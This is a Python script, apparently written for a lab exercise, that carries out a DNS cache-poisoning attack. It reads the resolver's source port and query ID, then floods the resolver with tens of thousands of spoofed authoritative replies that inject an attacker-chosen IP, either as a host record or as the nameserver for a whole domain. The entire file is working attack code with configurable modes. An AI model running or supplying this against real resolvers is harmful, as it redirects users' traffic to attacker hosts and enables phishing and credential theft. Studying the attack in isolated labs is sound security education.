import socket
import pickle
from dnslib import *
from scapy.all import *
import sys



def getInfo(host,dns,info):			#query the dns server in order to get an info as source port used  or query id used
	sock_info = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) #udp
	sock_info.bind(("",53))
	sock_info.settimeout(5)
	query = DNSRecord(q=DNSQuestion(host,QTYPE.A))
	
	while(True):
		sock_info.sendto(bytes(query.pack()), (dns,53))
		try:
			packet , addr = sock_info.recvfrom(1024)

		except socket.timeout:
			print("Timeout raised and caught")
			continue

		if(info == "sport"):
			sock_info.close()
			return addr[1]
		
		elif(info == "qid"):
			sock_info.close()
			dnsrec = DNSRecord.parse(packet)
			return dnsrec.header.id




def prepare_pkts_sub_dom_and_query(iteration,domain,ip_to_inject,ip_to_spoof,dns_ip,dns_sport,ttl,attack_type):
		answers=[]
		subdomain = str(iteration)+"."+domain
		question=DNSQuestion(subdomain,QTYPE.A) 
		query = DNSRecord(q=question)
		
		if (attack_type == "single" or attack_type == "single_sub"):
			answer=RR(subdomain,rdata=A("1.2.3.4"),ttl=60) #note that in the answer section we can add every ip address
			ar=RR(domain,QTYPE.A,rdata=A(ip_to_inject),ttl=ttl)
			
			for i in range(65536):
				d=DNSRecord(DNSHeader(id=i,qr=1,aa=1,ra=0),q=question,a=answer)
				d.add_ar(ar)
				spoofed_packet = IP(src=ip_to_spoof, dst=dns_ip) / UDP(sport=53, dport=dns_sport) / bytes(d.pack())
				answers.append(spoofed_packet)
			
		elif(attack_type == "zone" or attack_type == "zone_sub"):
			auth=RR(domain,QTYPE.NS,rdata=NS("ns."+domain),ttl=60)
			ar=RR("ns."+domain,QTYPE.A,rdata=A(ip_to_inject),ttl=ttl)
			
			for i in range(65536):
				d=DNSRecord(DNSHeader(id=i,qr=1,aa=1,ra=0),q=question)
				d.add_auth(auth)
				d.add_ar(ar)
				spoofed_packet = IP(src=ip_to_spoof, dst=dns_ip) / UDP(sport=53, dport=dns_sport) / bytes(d.pack())
				answers.append(spoofed_packet)
			
		return answers , query
		

def attack_single(ip_to_spoof,ip_to_inject,dns_ip,ttl,domain,my_hostname,dns_sport,sock_query,sock_answer):
	print("ready to attack:single")
	inc = 50 #used to increment the the start value of qid used during the flooding 
	max_number_of_qid = 65536
	max_inc = 800
	cont=1
	
	print("creating the spoofed packets ...")
	spoofed_pkts , query  = prepare_pkts_sub_dom_and_query(0,domain,ip_to_inject,ip_to_spoof,dns_ip,dns_sport,ttl,"single")
	print("..done")
	
	while(True):
		print("running the",cont,"attempt..")
		print("getting the more recent qid")
		qid=getInfo(my_hostname,dns_ip,"qid") #getting the QID
		print("the last qid is:",qid)
		
		qid+=inc
		limit = qid + 1500
		print("starting to flood")
		sock_query.sendto(bytes(query.pack()),(dns_ip,53))
		
		while(qid < limit and qid < max_number_of_qid):
			sock_answer.send(spoofed_pkts[qid])
			qid+=1
		inc+=50
		if(inc >= max_inc):
			inc=50
		cont+=1

def attack_single_sub(ip_to_spoof,ip_to_inject,dns_ip,ttl,number_of_subdomain,domain,my_hostname,dns_sport,sock_query,sock_answer):
	print("ready to attack:single_sub")
	inc = 50 #used to increment the the start value of qid used during the flooding 
	max_number_of_qid = 65536
	max_inc = 800
	for i in range(number_of_subdomain):
		print("creating the spoofed packets for",str(i)+"."+domain+"!")
		spoofed_pkts , query  = prepare_pkts_sub_dom_and_query(i,domain,ip_to_inject,ip_to_spoof,dns_ip,dns_sport,ttl,"single_sub")
		print("..done")
		
		print("running the",i+1,"attempt..")
		print("getting the more recent qid")
		qid=getInfo(my_hostname,dns_ip,"qid") #getting the qid
		print("the last qid is:",qid)
		
		qid+=inc
		limit = qid + 1500
		print("starting to flood")
		sock_query.sendto(bytes(query.pack()),(dns_ip,53))
		
		while(qid < limit and qid < max_number_of_qid):
			sock_answer.send(spoofed_pkts[qid])
			qid+=1
		inc+=50
		if(inc >= max_inc):
			inc=50
		
		del spoofed_pkts #save memory

def attack_zone(ip_to_spoof,ip_to_inject,dns_ip,ttl,domain,my_hostname,dns_sport,sock_query,sock_answer):
	print("ready to attack:zone")
	inc = 50 #used to increment the the start value of qid used during the flooding 
	max_number_of_qid = 65536
	max_inc = 800
	cont=1
	
	print("creating the spoofed packets ...")
	spoofed_pkts , query  = prepare_pkts_sub_dom_and_query(0,domain,ip_to_inject,ip_to_spoof,dns_ip,dns_sport,ttl,"zone")
	print("..done")
	
	while(True):
		print("running the",cont,"attempt..")
		print("getting the more recent qid")
		qid=getInfo(my_hostname,dns_ip,"qid") #getting the qid
		print("the last qid is:",qid)
		
		qid+=inc
		limit = qid + 1500
		print("starting to flood")
		sock_query.sendto(bytes(query.pack()),(dns_ip,53))
		
		while(qid < limit and qid < max_number_of_qid):
			sock_answer.send(spoofed_pkts[qid])
			qid+=1
		inc+=50
		if(inc >= max_inc):
			inc=50
		cont+=1
	
def attack_zone_sub(ip_to_spoof,ip_to_inject,dns_ip,ttl,number_of_subdomain,domain,my_hostname,dns_sport,sock_query,sock_answer):
	print("ready to attack:zone_sub")
	inc = 50 #used to increment the the start value of qid used during the flooding 
	max_number_of_qid = 65536
	max_inc = 800
	for i in range(number_of_subdomain):
		print("creating the spoofed packets for",str(i)+"."+domain+"!")
		spoofed_pkts , query  = prepare_pkts_sub_dom_and_query(i,domain,ip_to_inject,ip_to_spoof,dns_ip,dns_sport,ttl,"zone_sub")
		print("..done")
		
		print("running the",i+1,"attempt..")
		print("getting the more recent qid")
		qid=getInfo(my_hostname,dns_ip,"qid") #getting the qid
		print("the last qid is:",qid)
		
		qid+=inc
		limit = qid + 1500
		print("starting to flood")
		sock_query.sendto(bytes(query.pack()),(dns_ip,53))
		
		while(qid < limit and qid < max_number_of_qid):
			sock_answer.send(spoofed_pkts[qid])
			qid+=1
		inc+=50
		if(inc >= max_inc):
			inc=50
		
		del spoofed_pkts
		
	
def main():
	
####you have to set your paramaters here
	ip_to_spoof = ""                                            #captured by doing dig@dns_ip NS domain
	ip_to_inject = ""                                       #ip configured on the VM
	dns_ip = ""                                            #my vm's ip
	ttl = 10000                                                         #time to live 
	interface = ""
	number_of_subdomain = 10000                                         #useful for single_sub | zone_sub attack type
	domain = ""
	my_hostname = ""
	attack_type =""                                               #you can put [single|zone|single_sub|zone_sub]
	#single => try to inject your ip for the host "bankofallan.co.uk using query for a single subdomain(i.e 1.bankofallan.co.uk)
	#zone => try to inject your ip for the domain using query for a single subdomain as above.Your ip will be associated as the nameserver for the domain "bankofallan.co.uk"
	#single_sub => like single,but trying different subdomain sequentially
	#zone_sub => like zone ,but trying different subdomain sequentially
																												
	#single_sub or zone_sub are mandatory when the dns stores root name server's answers
	#single_sub or zone_sub can take much time																							
	####setting sockets to query and to flood dns server
	sock_query = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) #to query
	sock_answer = conf.L3socket(iface=interface) #to spoof authoritative ip address
	#####
	
	print("attack type: ",attack_type)
	print("getting the dns source port...")
	dns_sport = getInfo(my_hostname,dns_ip,"sport") 
	print("the dns source port is: ",dns_sport)
	
	if(attack_type == "single"):
		attack_single(ip_to_spoof,ip_to_inject,dns_ip,ttl,domain,my_hostname,dns_sport,sock_query,sock_answer)
	
	elif(attack_type == "single_sub"):
		attack_single_sub(ip_to_spoof,ip_to_inject,dns_ip,ttl,number_of_subdomain,domain,my_hostname,dns_sport,sock_query,sock_answer)
		
	elif(attack_type == "zone"):
		attack_zone(ip_to_spoof,ip_to_inject,dns_ip,ttl,domain,my_hostname,dns_sport,sock_query,sock_answer)
	
	elif (attack_type == "zone_sub"):
		attack_zone_sub(ip_to_spoof,ip_to_inject,dns_ip,ttl,number_of_subdomain,domain,my_hostname,dns_sport,sock_query,sock_answer)
	


if __name__ == "__main__":
	main()
